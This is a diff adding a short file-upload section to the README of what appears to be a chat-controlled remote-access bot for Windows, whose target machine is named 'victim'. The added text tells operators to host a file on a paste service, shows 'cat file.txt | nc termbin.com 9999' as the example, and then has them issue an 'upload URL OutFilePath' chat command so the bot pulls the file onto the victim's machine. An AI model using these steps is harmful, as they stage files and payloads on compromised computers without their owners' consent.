@@ -29,3 +29,7 @@ I have tested this on Win10. I will be rewriting the script for Powershell 2.0.
 * Set bot_id in send_message function
 * The conditions that mention the bot's name may need to be changed if your bot is named something other than 'victim'
 
+**For file Uploading**
+You'll need to host your file somewhere like pastebin, termbin, or dropfile. 
+Ex. - cat file.txt | nc termbin.com 9999
+- Get the URL and use it to run your command in chat as such: upload URL OutFilePath
